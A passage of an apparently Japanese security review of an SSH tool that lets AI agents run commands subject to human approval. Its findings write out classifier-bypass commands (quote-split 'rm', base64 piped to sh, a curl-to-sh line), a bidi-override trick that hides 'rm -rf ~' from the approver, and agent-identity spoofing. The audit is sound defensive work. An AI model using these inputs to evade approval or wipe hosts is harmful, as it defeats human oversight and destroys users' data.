| N10 | minor | P2 | p2-frontend-xss | frontend/src/terminal-tabs.js:640 | role=tab がフォーカスできない div に付き、中のボタンに選択状態がない |
| N12 | minor | P3 | p3-mcp | mcp_status.go:205 | get_request_status が requested_by を照合せず、他エージェントの stdout/stderr を返す |
| N13 | minor | P3 | p3-mcp | mcp_server.go:179 | /audit が SSH ログインユーザー名（User）と ConnectionID を伏せずに返す |
| N14 | minor | P3 | p3-auth | mcp_server.go:398 | client_request_id の重複排除キーに認証の有無が入らず、他エージェントの名義で先取りできる |
| N20 | minor | P3 | p3-hostkey | hostkey.go:263 | 認証前の HostKeyCallback で TOFU 記録するので、認証失敗や指紋を見せない経路でも鍵が信頼される |
| N21 | minor | P3 | p3-storage | storage.go:218 | v3 移行で既存行の target_fp を埋めず、v2 から持ち越した pending に実行先変更のガードが効かない |
| N22 | minor | P2 | p2-terminal | terminal.go:679 | ResizeTerminal の WindowChange がロック外で、連続したリサイズが逆順にリモートへ届く |
| N23 | minor | P2 | p2-app | app.go:901 | DeleteConnection が実行中コマンドを cancel せず、件数表示からも切断操作からも見えなくなる |
| N24 | minor | P2 | p2-app | app.go:397 | shutdown が実行中コマンドを待たずにすぐ cancel する（仕様は「待ってから cancel」） |
| N27 | minor | P3 | p3-mcp | mcp_server.go:510 | 承認省略の実行が切り離されたときの応答が仕様の state=running ではなく auto_running |
| N28 | minor | P3 | p3-auth | app.go:962 | 承認省略の判定がエージェント名だけで、ローテーション前のトークンで認証済みの要求が自動実行される |
| N30 | minor | P3 | p3-risk | mcp_server.go:1023 | バックスラッシュのエスケープと行継続を処理せず、`\rm` と `r\<LF>m` が Low になる |

### 3.2 各指摘の詳細

#### N15 [critical/P3/p3-risk] mcp_server.go:1023（グループ γ、前回 #5/#28 の続き）

**内容**: riskWords が `'` と `"` を単語の区切りとして扱う。シェルでは隣り合うクォート部分やバックスラッシュは同じ単語に連結されるため、`r''m` / `"r"m` / `\rm` / `r\m` は rm として実行されるが、分類上は rm という単語が現れない。High のコマンドが Low になり、承認省略の付いたエージェントでは人の承認なしに自動実行される。#5/#28 の修正として新しい分割処理は不完全。

**シナリオ**: bypass 付与済みのエージェント（既定 max_risk=Medium）が自分のトークンで `execute_command {host:"lab", command:"r''m -rf /srv/data"}` を送る。riskWords は `["r","m","-rf","/srv/data"]` を返し、classifyRisk=Low、needsHumanApproval=false。スクラッチコピーで bypassAgent ハーネスを使って確認し、risk=Low・auto_executed=true で、SSH テストサーバーに `r''m -rf /srv/data` が届いた。`\rm -rf x`、`"r"m -rf x`、`su -c 'r''m -rf /'`、`bash -c "r\m -rf /x"` も Low。Low なので RequireApprovalWriteOp（risk != "Low"）にもかからない。

**修正案**: クォートとバックスラッシュを区切りにせず、POSIX のクォート除去（隣接部分の連結と `\` の除去）をしてから単語を組み立てる。`$` `` ` `` `\` を含む単語や解析できないクォートを含む単語は最低でも Medium、できれば High（常にキュー）にして fail-closed にする。`r''m` / `\rm` / `"r"m` をテストに入れる。

#### N16 [critical/P3/p3-risk] mcp_server.go:938（グループ γ）

**内容**: classifyRisk は字面の単語しか見ず、シェル展開やインタプリタを経由した間接実行を考慮していない。変数展開・`$IFS`・ANSI-C クォート・eval・base64|sh・curl|sh・python -c で書いた破壊的コマンドが Low になり、承認省略で自動実行される。design-v1 §要件10「High は常にキュー」の不変条件が守られない。

**シナリオ**: bypass エージェントが `echo cm0gLXJmIC94 | base64 -d | sh`（`rm -rf /x` をデコードして実行）を送ると Low として自動実行される（スクラッチの probe で auto_executed=true、SSH サーバーへの送信を確認）。ほかに Low になるもの: `rm${IFS}-rf${IFS}/x`（`{` `}` が区切りなので "rm$" と "ifs" に分かれる）、`a=r;b=m;$a$b -rf /x`、`$'\x72m' -rf x`、`eval "r""m -rf /x"`、`curl http://e/x | sh`、`python3 -c "import shutil;shutil.rmtree('/srv')"`、`alias x=rm;x /y`。

**修正案**: ブラックリストで安全と判定するのをやめて fail-closed にする。`$` 展開・`` ` ``・eval・source・alias、sh/bash/zsh/dash（-c やパイプ入力）、python/perl/ruby/node（-c/-e）、base64 -d / xxd -r の後にパイプで続く実行などを含むものは High（またはキュー強制）。許可するなら、bypass で自動実行できるのは許可リストのコマンドだけに限る。

#### N1 [major/P2/p2-terminal] terminal.go:553

**内容**: シリアルのタブを閉じると、closer（port.Close）が走ってから ts.done が閉じるまでの間も pumpTerminalInput が ts.stdinWriter.Write を呼び続ける。go.bug.st/serial v1.7.1 の unixPort.Write は opened を確かめずに unix.Write(port.handle) を呼ぶので、macOS/Linux では、閉じた後に別の用途で再利用された fd 番号にユーザーのキー入力が書き込まれる。

**シナリオ**: finishTerminal の順序は closer() → ts.cancel() → ts.out.close()（残りの出力を drain/emit）→ dropTerminalLocked → markDone で、この間 ts は a.terms に残る。closer の中で fd は close される。SendTerminalInput は OK:true を返して ts.input に積み、pump の select は done がまだ閉じていないので input を取って port.Write に進む。done が閉じた後も input にデータが残っていれば、select はランダムに選ぶので書き込みが起こりうる。その間に同じプロセスの別の処理（別タブの SSH ダイヤル、MCP の HTTP accept、別のシリアルポートのオープン、SQLite の新しいプール接続の DB/WAL ファイル）が最小の空き fd を取ると、閉じたタブ宛ての入力がそのソケットやファイルに生のバイトで書き込まれる。ソケットなら SSH ストリームや MCP の HTTP 応答が壊れ、DB ファイルなら pwrite でない write でファイルオフセット（多くは 0）から上書きされうる。スクラッチで再現（`<scratchpad>/p2term/zz_e2e_test.go`）: pty のスレーブをシリアルポートとして StartTerminal し、最後の drain が終わる前に CloseTerminal、その間に os.CreateTemp でファイルを開き、SendTerminalInput("rm -rf ~\n") を送ると、OK:true でそのファイルの中身が `rm -rf ~\n` になった（3回中3回、fd 6/7 が再利用）。Windows は Close が handle=0 にするので起きない。SSH もチャネルを閉じた後の Write はエラーになるので起きない。

**修正案**: stdinWriter をラップし、書き込みと closer の close を同じ mutex で直列化して、close 後の Write は io.ErrClosedPipe を返す。finishTerminal の冒頭（closer より前）で閉じた印を立てるか done を先に閉じ、pump と SendTerminalInput はその印で受け付けと書き込みを止める。serial の closer は pump の終了を待ってから port.Close を呼んでもよい。

#### N2 [major/P2/p2-app] approval.go:143（グループ δ）

**内容**: approve() は executeSSH が trackExec を呼ぶより前に要求を running にする（transitionRequest と setAgentApprovalBypass の DB 書き込み）。executeCommandAndLog も recordCommandRequest(auto_running) と executeSSH の間に同じ隙間がある。この隙間に DisconnectConnection が来ると何も cancel せず「実行中コマンド 0件」と返し、コマンドは切断したはずの接続でそのまま最後まで実行される。

**シナリオ**: スクラッチコピーで再現。web-01 に `sleep 0.3` を積み、ApproveCommandAndBypassAgent を呼ぶ。findRequest が Status==running を示した直後に DisconnectConnection(web-01) を呼ぶと「web-01 を切断しました（ターミナル 0 件・実行中コマンド 0 件を終了）」が返り、サーバーの Execs() に `sleep 0.3` が記録され、要求は succeeded で終わった。確認ダイアログの件数は trackExec 由来の SessionSummary.Running なので、UI が実行中と表示している要求についても 0 と出る。ユーザーは切断で全部止まったと思うが、承認済みまたは承認省略の（High の可能性もある）コマンドがホストで動き続ける。

**修正案**: pending→running / auto_running の遷移の前、または遷移と不可分に a.execs（要求 ID/接続 ID をキー）へ登録し、その追跡済みの context を executeSSH に渡す。あるいは DisconnectConnection が、その接続でまだ追跡されていない running 要求にも印を付け、executeSSH がその印を見て開始を拒む。

#### N5 [major/P2/p2-frontend-state] frontend/src/editor.js:821（グループ β）

**内容**: renderAfterAction（と main.js:80 の setLang→renderAll）は pageIsBusy() を無視して、そのとき表示中のページに ctx.renderPage() を呼ぶ。接続テストの実行中にユーザーがコマンド画面や設定画面へ移っていると、そこでの未保存の編集が元の値で上書きされ、dirty.approval / dirty.settings は true のまま残る。

**シナリオ**: 接続先画面で、応答しないホストに「接続テスト」を押す（TestConnectionConfig は既定で最大 10秒の connectTimeout を待つ）。その間に「コマンド承認」を開き（下書きは未変更なので confirmLeaveEditor は true）、エージェントの要求 A の #approval-command を `rm -rf /data/*` から `ls /data/` に直す。input ハンドラが dirty.approval=true にするので 5秒ポーリングはフォームに触れない。テストが返ると runConnectionTest→renderAfterAction は、このページに #connection-form がないので editorHasFocus() が false となり ctx.renderPage() を呼ぶ。renderCommands が textarea を selected.command（元の `rm -rf /data/*`）で描き直す。dirty.approval は true のままなので以後のポーリングでも直らず、フォームの id と固定された選択がどちらも A なので approvalTarget() も通る。読み返さずに「承認」を押すと `ApproveCommand(A, 'rm -rf /data/*')` で元のコマンドが実行される。設定画面でも同じ経路で MCP フォームの全項目と入力中の tokenInput が state.settingsMcp に戻る。ヘッダーの言語ボタン（setLang→renderAll）でも承認・設定の編集が消える。

**修正案**: renderAfterAction は ctx.state.active !== 'connections' のとき何もしない（またはエディタ部分だけ更新する）。setLang とすべての非同期完了経路を、pageIsBusy() を尊重する renderPage のガード経由にする。あるいは承認・設定フォームの値を state に保持し、そこから描き直す。

#### N6 [major/P2/p2-frontend-state] frontend/src/terminal-tabs.js:383

**内容**: SendTerminalInput が input_timeout で失敗すると、flushInput は失敗したチャンクと保留中の入力をすべて捨てるが、タブは 'open' のまま後続のキー入力を送り続ける。リモートには前の入力と後の入力が、間を黙って欠いたまま届くので、途中の欠けた行が実行されうる。

**シナリオ**: 遅いシリアルコンソール（9600 baud）や詰まった SSH チャネルでセッションの書き手がブロックし、64 件の input チャネルが前のキー入力で埋まる。次の SendTerminalInput は terminalInputTimeout（2秒）待って input_timeout を返し、バックエンドはそのチャンクを積んでいない（select がタイマーを選ぶ）。フロントは pendingInput を空にし、3.2秒のトーストを出すだけ。リモートのエコーも止まっているので、何が失われたかは画面に出ない。ユーザーが入力を続けて Enter を押すと、リモートの行は [積まれていた前半] + [失敗後に打ったキー] になる。例えば `tmp/cache` が捨てられたチャンクにあれば `rm -rf /var/` + `\r`。対話経路には承認ゲートがないので、継ぎはぎの破壊的な行が実行される。

**修正案**: input_timeout のとき、何事もなかったように入力を受け続けない。ユーザーが確認するまで disableStdin やタブへの印で送信を止める。あるいは失敗したチャンクを pendingInput の先頭に残して順番どおり再送し、後の入力を先に送らない。必要なら、捨てた後に ^U を送ってリモートの行を消す。

#### N11 [major/P3/p3-mcp] mcp_server.go:426

**内容**: execute_command の timeout_seconds が、承認待ちに入る通常経路では捨てられる。queueCommand に渡されず、CommandRequest にも保存されず、ApproveCommand は executeSSH(execCtx, conn, command, 0) で接続先の既定値を使う。この値が効くのは承認省略で即時実行する runBypassedCommand だけ。

**シナリオ**: エージェントが `{host:"web1", command:"tail -f /var/log/app.log", timeout_seconds:10}` を送る（Low だが承認省略なしの通常経路）。人が承認しても 10秒では止まらず、conn.CommandTimeout（未設定なら 30秒、設定次第で最大 3600秒）まで動く。その間 GUI の Approve 呼び出しは返らず、エージェントは timed_out の予定が外れたまま get_request_status で待ち続ける。逆に長い timeout_seconds を指定しても既定値でタイムアウトする。スキーマの説明「実行タイムアウト（省略時は接続先の設定）」とも、v0 指摘「timeout_seconds 未使用 → 実装する」とも食い違う。

**修正案**: command_requests に timeout_seconds 列を持たせ（あるいは CommandRequest に保存し）、queueCommand で記録して ApproveCommand の executeSSH に渡す。キュー経路で timeout_seconds が効くテストを足す。

#### N17 [major/P3/p3-risk] mcp_server.go:946（グループ γ、前回 #48 の続き）

**内容**: highPhrases（`" dd if="`、`" systemctl stop "`、`" systemctl restart "`、`" chmod -r"`、`" chown -r"`、`" service stop "`）は、正規化した文字列にその並びがそのまま含まれるかだけで判定する。オプションを先に置く、順序を変える、別のサブコマンドを使う、だけでリストにあるコマンドでも Low になる。

**シナリオ**: bypass エージェントの次のコマンドはすべて Low で自動実行される: `dd bs=1M if=/dev/zero of=/dev/sda`、`dd of=/dev/sda if=/dev/zero`（probe で `dd bs=1M...` が auto_executed=true、SSH 送信を確認）、`systemctl -q stop sshd`（probe で自動実行を確認、リモートの sshd が止まり以後接続できない）、`systemctl --no-block restart sshd`、`systemctl disable --now sshd`、`systemctl kill sshd`、`chmod 000 -R /etc`、`chmod --recursive 000 /etc`、`chown root -R /home`。iptables/ip6tables は単語の完全一致なので `ip6tables-legacy -F` と `iptables-restore < /dev/null` も Low。

**修正案**: コマンド名（basename 後の単語）を見つけたら、そのセグメント内の後続の引数を順序を問わず調べる。dd はセグメント内に `of=` があれば High。systemctl は stop/restart/kill/mask/disable/isolate のいずれかがあれば High。chmod/chown は `-R` / `--recursive` がどこかにあれば High。iptables* / ip6tables* / nft* は接頭辞で一致させる。順序違いの入力をテストに追加する。

#### N18 [major/P3/p3-hostkey] hostkey.go:237（グループ α）

**内容**: 未知のホストで @cert-authority 行も一致しないと HostKeyAlgorithms が nil のままになり、x/crypto の既定値で証明書アルゴリズムが先に提示される。ホスト証明書を持つサーバーは証明書を返し、CertChecker.CheckHostKey は KeyError ではない素のエラー "ssh: no authorities for hostname" を返し、コールバックはそれをそのまま返す。TOFU は鍵を記録しないので、そのホストには永久に接続できない。

**シナリオ**: サーバーに HostCertificate が設定されている（組織の SSH CA でよくある）。ユーザーは既定の非 strict モードで、CA 行はない。GUI の「接続テスト」やターミナルは `ssh: handshake failed: ssh: no authorities for hostname: 127.0.0.1:57329` で失敗し、known_hosts は空のまま。スクラッチのテストで sshtest サーバーに NewCertSigner を使って再現した。何も記録されないので初回接続が毎回失敗し、MCP も失敗する。a6f2706 以前（InsecureIgnoreHostKey）は接続できたので退行。hostKeyErrorKind が "" を返すので、error_kind（hostkey_unknown）も explainSSHError の案内も正しく出ない。strict モードでも、未知の証明書ホストは hostkey_unknown ではなく接続系のエラーになる。

**修正案**: 既知の鍵も一致する CA もないときは、証明書アルゴリズムを除いた素のアルゴリズムだけで交渉する。あるいは、コールバックが証明書を受け取り IsHostAuthority が false なら、cert.Key について TOFU / 未知の扱いに戻す。

#### N31 [major/P3/p3-hostkey] hostkey.go:232（グループ α、N18 と同一）

**内容**: 記録済みの鍵がないホストでは HostKeyAlgorithms が nil で、ライブラリ既定が証明書アルゴリズムを先に出す。証明書を持つサーバーは証明書を返し、CertChecker が KeyError でない "no authorities for hostname" で失敗し、TOFU の分岐に入らない。非 strict モードではそのようなホストを信頼することも接続することもできない。以前の非 strict モードは InsecureIgnoreHostKey で接続できたので退行。

**シナリオ**: HostCertificate を設定した sshd を用意し、strict モードはオフ、アプリの known_hosts に @cert-authority 行を入れない。非 strict モードは ~/.ssh/known_hosts を読まないので、そちらの CA 行は効かない。ホストを追加して GUI から「接続テスト」かターミナルを開くと、クライアントは defaultHostKeyAlgos（ssh-rsa-cert-v01 など証明書が先）を送り、サーバーは証明書で応じる。knownhosts の CertChecker.CheckHostKey が `fmt.Errorf("ssh: no authorities for hostname: ...")` を返し、これは *knownhosts.KeyError ではないので L250-251 でそのまま返され、recordHostKey に届かない。以後の試行も同じく失敗し、MCP の実行も error_kind "" で失敗する。スクラッチで `newHandshakeOnlyServer(certSigner, hostSigner)` と `testSSHConnection(conn, false)` で err="ssh: handshake failed: ssh: no authorities for hostname: 127.0.0.1:NNNN"、known_hosts は空、2回目も同じ失敗。既存の TestHostKeyCertAuthorityInStrictMode は strict モードかつ CA 行ありだけを見ている。

**修正案**: TOFU が許される未知ホスト（GUI 起点、非 strict）では、supportedHostKeyAlgos から証明書アルゴリズムを除いた一覧を HostKeyAlgorithms に渡し、素の鍵を記録させる。あるいは *ssh.Certificate を受け取って CA が一致しないとき、cert.Key で記録・比較するか hostkey_unknown として扱う。非 strict・既知エントリなしで証明書を出すサーバーのテストを足す。

#### N19 [major/P3/p3-hostkey] app.go:1205

**内容**: ResetHostKey と GetHostKeyInfo が Wails バインディングとして追加されたが、frontend/src（main.js）にそれを呼ぶコードがなく、設計書（design §、291行付近）のホスト鍵表示とリセットボタンが実装されていない。正当なホスト鍵の変更から GUI で復旧する手段がないのに、ホスト鍵エラーのメッセージは接続先画面でリセットするよう案内する。

**シナリオ**: サーバーの鍵が正当に作り直される。以後「接続テスト」・ターミナル・MCP のすべてが mismatch で失敗し、メッセージは「接続先画面でホスト鍵をリセットしてから接続テストをやり直してください」と言う。そのボタンは存在しない（frontend/src と生成された wailsjs を ResetHostKey で grep すると 0件）。抜け道は appConfigDir()/known_hosts の手編集だけで、ふつうのユーザーにとってそのホストは恒久的に使えなくなる。

**修正案**: 接続先編集画面に指紋の表示と、確認付きの［ホスト鍵をリセット］ボタンを足す。それまではメッセージを変える。

#### N25 [major/P2/p2-frontend-state] frontend/src/main.js:80（グループ β）

**内容**: 言語切替は renderAll() を呼び、未保存の編集を確かめずにページを描き直す。承認の textarea はエージェントの元のコマンドに、設定フォームは state.settingsMcp に戻るが、state.dirty.approval と state.dirty.settings は true のまま。承認すると元のコマンドが送られ、保存すると戻った設定が送られる。フェーズ2の受け入れ基準「入力中の値がトーストや言語切替で消えない」（design-v1.md:336）を、接続先エディタ以外のすべてのページで満たしていない。

**シナリオ**: フロントのスクラッチコピーで、main.test.js のモックを使って実物の main.js で再現した。(1) コマンド画面で pending の REQ-A のコマンドが `rm -rf /tmp/x/*`。ユーザーが textarea を `ls /tmp/x` に直し、dirty.approval=true。(2) 言語ボタン（data-lang="en"）を押すと setLang → renderAll → renderCommands が selected.command で #approval-command を描き直し、textarea は `rm -rf /tmp/x/*` に戻る。dirty.approval は true のまま、フォームの data-request-id も選択と一致したまま。(3) 承認を押すと approvalTarget() はフォームを受け入れ、`ApproveCommand(['REQ-A','rm -rf /tmp/x/*'])` が呼ばれ、編集後ではなく破壊的な元のコマンドが送られる。dirty.approval が true のままなので pageIsBusy() も true を返し続け、ポーリングでキューが描き直されなくなる。設定画面では tokenName に 'edited' と打って（dirty.settings=true）言語を切り替えると tokenName が空になり、後の保存は戻ったフォームを送るので、有効にしたばかりの bearerEnabled を含めて編集が黙って捨てられる。

**修正案**: 接続先エディタの下書きと同じように、言語切替でも入力を保つ。renderAll の前に、現在の #approval-command の値（data-request-id をキーに）と #mcp-form の値（collectMCPForm）を state に読み取り、そこから描く。あるいは dirty.approval / dirty.settings が立っているときは、ラベル（ヘッダー・ナビ・サイドバー）だけを更新して #page-root に触れない。「編集→言語切替→承認」の main.test.js のケースを足す。

#### N26 [major/P2/p2-frontend-xss] frontend/src/main.js:554

**内容**: 承認画面はエージェントのコマンドを生の Unicode のまま表示する。双方向の上書き・分離文字（U+202A-202E、U+2066-2069）やその他の不可視の書式文字を除去も可視化もしないので、承認者が読むコマンドと実行されるコマンドが食い違いうる。キューの行（511行付近の `<code class=text-truncate>`）と履歴の `<code>` も同じ。バックエンドもこれらの文字を拒まず、mcp_server.go:296 の executeCommandTool は TrimSpace と空チェックだけ。

**シナリオ**: MCP エージェントが無害な reason を付けて `command = "echo ok ‮⁦; rm -rf ~ ⁩⁦#⁩"` を送る。RLO による上書きで、ブラウザは分離された 2 つの部分を逆順に描き、textarea・キュー・履歴はどれも `echo ok #; rm -rf ~` と、rm がコメントアウトされたように見せる。シェルから見ると、トークンは `echo ok <不可視>`、`;`、`rm -rf ~`、`<不可視>#<不可視>` で、`#` は単語の先頭にないのでコメントにならない。末尾の不可視トークンは -f が無視する rm の余分なオペランドにすぎない。承認者は何もしないように見えるコマンドを承認し、未変更の textarea の値（編集は検出されない）が ApproveCommand に送られ、対象ホストで `rm -rf ~` が実行される。escapeHtml は HTML の注入を防ぐだけで、表示と実行の食い違いには効かず、人による承認の段階が無力化される。

**修正案**: executeCommandTool（と編集後の ApproveCommand）で、Unicode の Cf/bidi 制御文字と、\n・\t 以外の C0/C1 制御文字を含むコマンドを拒否する。あるいはコマンドを表示するすべての箇所でそれらを `<U+202E>` のようなバッジとして見せ、承認カードに警告バナーを出す。U+202E/U+2066 を含むコマンドが拒否または警告されるテストを足す。

#### N29 [major/P3/p3-risk] mcp_server.go:1025（グループ γ）

**内容**: riskWords は `{` と `}` を、次の単語をコマンド位置に置く区切りとして扱うが、`,` は区切りにしない。そのため bash のブレース展開 `{rm,-rf,/tmp/x}` は basename 化（1005行）で単語 "x" だけに縮み、classifyRisk は Low を返す。

**シナリオ**: bypass 付与と専用トークンを持つエージェント（既定 max_risk Medium、RequireApprovalWriteOp=true なので自動実行は Low だけ）が `{rm,-rf,/var/lib/app}` を送る。riskWords は `{` で分割し、コマンド位置の単語 "rm,-rf,/var/lib/app" を basename の "app" に縮めて `["app"]` を返す。classifyRisk は Low、needsHumanApproval は false、runBypassedCommand が人の承認なしに実行する。リモートのログインシェル（bash）がブレース展開して `rm -rf /var/lib/app` を実行する。スクラッチで classifyRisk("{rm,-rf,/tmp/x}") = Low、riskWords = `["x"]` を確認。新しい `{` `}` の扱いと basename 化が組み合わさって High の単語が完全に消える経路で、クォートや展開の指摘とは別。

**修正案**: `,` や `{` を含む単語を分類不能として扱うか、`,` も区切りにする。`{` `}` の直後の単語を basename 化しない。さらによいのは、ブレース・グロブ・エスケープのメタ文字（`{ } , \ ? [ $`）を含む単語を High にする（fail-closed）。

#### N3 [minor/P2/p2-app] ssh_exec.go:99（グループ δ）

**内容**: runSSHCommand は openSSHClient/NewSession と session.Run の間で ctx を確かめない。この隙間に来たキャンセル（DisconnectConnection、または NewSession が遅いときの終了）では、リモートでのコマンド開始を止められない。開始後に SIGKILL されるだけで、要求は failed/canceled と記録され、監査ログ上は止めたことになるが実際には実行が始まっている。

**シナリオ**: 承認済みの `rm -rf /data/x` がハンドシェイクと NewSession の間にある（遅いサーバー、または #7 のように NewSession がブロック）ときにユーザーが切断を押す。cancel(errDisconnected) が発火し、その後 NewSession が返り、session.Run が exec 要求を送り、その後に select が ctx.Done を見て SIGKILL を送る。リモートのコマンドはすでに始まっており、ツリーの一部を消しているかもしれない。記録は ErrorKind 'canceled' で、開始したことは示さない。シグナル要求を無視するサーバーなら動き続ける。

**修正案**: openSSHClient の後と session.Run の直前で ctx.Err() を確かめ、キャンセル理由を返してコマンドを始めない。切断と終了はフェーズ2で増えたキャンセル元なので、この隙間は UI から到達できるようになった。

#### N4 [minor/P2/p2-app] frontend/src/editor.js:584（グループ δ）

**内容**: 切断ボタン（と editor.js:1114 のガード）は connState が connected/in_use/connecting のときだけ有効だが、sessionSummaries は connState をタブだけから決める（「実行中のコマンドは connState を変えない」）。タブがなく、実行中の MCP や承認済みのコマンドがある接続は 'disconnected' と表示され、GUI からそれらを止める手段がない。§5.1 では切断が実行中の MCP コマンドを止める手段とされている。

**シナリオ**: 承認省略のエージェントが web-01 で長いコマンド（timeout_seconds 最大 3600）を実行し、ユーザーはターミナルを開いていない。サイドバーは running=1 を示すが connState は 'disconnected' なので、エディタの切断ボタンは「接続していません」のツールチップ付きで無効になり、クリックハンドラも早期 return する。タイムアウトかアプリ終了まで止められない。

**修正案**: connState だけでなく SessionSummary.Running > 0（または Connecting/Shells > 0）でも切断を有効にし、クリックのガードも同じ規則にする。

#### N7 [minor/P2/p2-frontend-state] frontend/src/editor.js:1305（前回 #35 の取りこぼし）

**内容**: 認証方式の切替で credential を引き継ぐかどうかを決める looksLikePath が前方一致の正規表現。`~` `/` `%` で始まる入力済みのパスワードは残って鍵パス欄に平文で出る。一致しない鍵パス（`C:/...`、相対の `id_rsa`、`$HOME/...`）は残って SSH パスワードとして保存される。元の欠陥の繰り返しではなく、#35 の修正で残った隙間。

**シナリオ**: (1) パスワード認証の接続でユーザーが新しいパスワード `/Tr0ub4dor`（または `%pass`、`~secret`）を打ち、認証方式を SSH鍵認証に切り替える。toPassword=false かつ looksLikePath=true なので draft.credential が残り、keyPathCol が type="text" で鍵パス欄に表示する。保存すると鍵パスとして平文で保存され、後の接続やテストはそのパスで失敗し、パスワードを含むエラー文が lastTestMessage・トースト・UI に出うる。(2) 鍵パス `C:/Users/me/.ssh/id_ed25519` や `keys/id_rsa` でパスワード保管に切り替えると、値はマスクされたパスワード欄に残る。保存するとそれがパスワードになり、リモートの sshd に送られる。

**修正案**: authMethod が変わったら常に credential を空にする。鍵パスは keyPathStash に保持し、鍵認証に戻したときだけ戻す。入力済みのパスワードは決して引き継がない。

#### N8 [minor/P2/p2-frontend-state] frontend/src/main.js:934

**内容**: approve-command は ApproveCommand を呼ぶ前に dirty.approval=false にする。バックエンドが risk_increased を返し、ユーザーが確認ダイアログを取り消すと、続く refreshData がフォームを描き直して編集済みのコマンドが失われる。

**シナリオ**: pending の要求 A のコマンドを編集し、その編集でリスクが上がる（例: Low→High）。承認を押すと ApproveCommand が risk_increased を返し、window.confirm が開く。編集を見直すためにキャンセルを押す。ハンドラはそのままトースト→refreshData と進み、dirty.approval は既に下がっているので pageIsBusy() は false、renderCommands が #approval-command を A の元のコマンドで描き直す。編集は警告なしに消え、もう一度承認を押すと、見直したものではなくエージェントの元のコマンドが承認される。

**修正案**: dirty.approval はバックエンドが受け入れた（result.ok）後にだけ下げる。risk_increased でキャンセルされたら、フォームと dirty はそのままにして再描画しない。

#### N9 [minor/P2/p2-frontend-xss] frontend/src/main.js:343

**内容**: ターミナル画面では pageIsBusy() が常に false。5秒ごとのポーリングと sessions:changed のたびに #page-root.innerHTML が書き換わり、タブ列のボタンと「新しいシェル」の select が置き換わる。これらのキーボードフォーカスが失われ、変更中の select は切り離される。

**シナリオ**: キーボードやスクリーンリーダーの利用者が Tab でタブの閉じるボタンや「新しいシェル」の接続先 select に到達する。5秒以内に pollData → fetchData → renderPage がノードを置き換え、フォーカスは body に落ち、操作対象に安定して届かない。ユーザーが select を変えている最中にポーリングが来ると、change イベントは切り離された古い select で発火し、委譲された app の 'change' リスナーに届かないので newTarget は更新されず、描き直された select は前の接続先を示す（terminal-tabs.js:664）。見直さずに「新しいシェル」を押すと、前の接続先でシェルが開く。

**修正案**: document.activeElement が .term-toolbar の中にある間はターミナル画面を busy とみなす。あるいはタブ列をサイドバーの morphChildren のように差分で描き直し、data-term-id でフォーカスを戻す。

#### N10 [minor/P2/p2-frontend-xss] frontend/src/terminal-tabs.js:640

**内容**: role="tab" と aria-selected がフォーカスできない div に付いており、その div が 3つのボタン（切替・再接続・閉じる）を含む。ARIA では tab の子は presentational で、実際にフォーカスを受ける要素（内側のボタン）には選択状態がない。tablist に aria-controls も tabpanel も矢印キーの処理もない。

**シナリオ**: WKWebView の VoiceOver で、アクティブなタブの切替ボタンにフォーカスすると「web-01 #1」というラベルのただのボタンとして読まれ、どのタブがアクティブか分からない。tab の子は presentational なので、role=tab の中の閉じる・再接続ボタンが別のコントロールとして公開されないことがあり、タブごとの aria-label 'Close {label}' も支援技術に届かないことがある。

**修正案**: role=tab・aria-selected・roving tabindex を切替ボタンに付け、閉じる・再接続ボタンを tab 要素の外（同じコンテナ内の兄弟）に出す。あるいは tab/tablist のロールをやめ、切替ボタンに aria-current を使う。

#### N12 [minor/P3/p3-mcp] mcp_status.go:205

**内容**: get_request_status（lookupViews と requestView）は requested_by と呼び出し元を照合せず、任意の request_id の stdout/stderr を返す。request_id は `REQ-<unix ms>-<全体で連番の seq>` で推測できる。get_command_history を呼び出し元に絞り stdout を省いても、他エージェントの出力は読めてしまう。

**シナリオ**: Bearer 有効。エージェント B は自分専用のトークンだけを持ち、承認省略なし。B は自分の要求で REQ-1761600000123-57 を得る。seq 56 以前は他エージェントの要求なので、ミリ秒部分を wait_seconds=0 で 1回 20件ずつ総当たりする（ループバックなら数分）。これでエージェント A の `cat ~/.aws/credentials` などの stdout が得られる。もっと簡単には、B のトークンで get_command_history all_agents=true を呼べば A の request_id が直接手に入り、続く get_request_status で stdout まで読める。エージェント専用トークンで呼び出し元を絞る設計が、出力には効いていない。

**修正案**: caller.Agent がある場合、requested_by が一致しない要求は not_found にする（Bearer の共有トークンと GUI だけは全件を許す）。あわせて request_id に乱数を入れる。

#### N13 [minor/P3/p3-mcp] mcp_server.go:179

**内容**: /audit は「list_hosts や get_request_status と同じく実行先を伏せる」として TargetFP と stderr の詳細を消しているが、CommandRequest.User（SSH ログインユーザー名）と ConnectionID はそのまま返す。

**シナリオ**: 任意のエージェント専用トークン（Bearer 無効ならループバック上の誰でも）で GET /audit を呼ぶと、各要求の `"user":"deploy"` が返る。list_hosts が意図的に伏せている user@host:port の user 部分が、全接続先・全エージェントについて分かる。

**修正案**: handleAudit のマスク処理で requests[i].User = "" にする。エージェント向けの形（requestView）に揃えて返すのがよい。

#### N14 [minor/P3/p3-auth] mcp_server.go:398

**内容**: client_request_id の重複排除キーは (agent_name, client_request_id) で、呼び出し元がそのエージェントのトークンで認証したかを記録しない。共有トークンしか持たない呼び出し元や、Bearer オフでの未認証のループバック呼び出し元が、専用トークンを持つエージェントの名前を名乗ってその client_request_id を先に取ると、本物のエージェントの後の要求が攻撃者の要求に結び付けられる。前回 #15/#17/#30（並行性）とは別件。

**シナリオ**: スクラッチコピーのテストで確認（`<scratchpad>/p3copy/zz_audit_test.go`）。"claude" にエージェントトークンを発行する。未認証の呼び出し元が `execute_command{host:web, command:"rm -rf /srv/data", agent_name:"claude", client_request_id:"k1"}` を送る。High なので requested_by=claude の pending として保存される。本物の claude が自分のトークンで `execute_command{command:"uptime", client_request_id:"k1"}` を送ると、応答は deduplicated=true、request_id は攻撃者のもの、requested_command="rm -rf /srv/data"。uptime は実行されず、claude は攻撃者の要求を自分のものとしてポーリングし続ける。GUI と監査ログはこの要求を claude からのものとして示し、トークンなしで作られた印もないので、人は claude を信頼して破壊的なコマンドを承認しうる。攻撃者は client_request_id を知るか推測する必要がある（連番や決定的な id を使うエージェントなど）。

**修正案**: 重複排除キーに認証を含める。caller.Agent（または「トークン認証済み」の印）を lockKey と existingClientRequest のキーに入れ、要求にも保存する。あるいは agent_tokens の行に結び付いた agent_name は、そのエージェント自身のトークンがない限り拒否する（unauthorized_bypass）。

#### N20 [minor/P3/p3-hostkey] hostkey.go:263

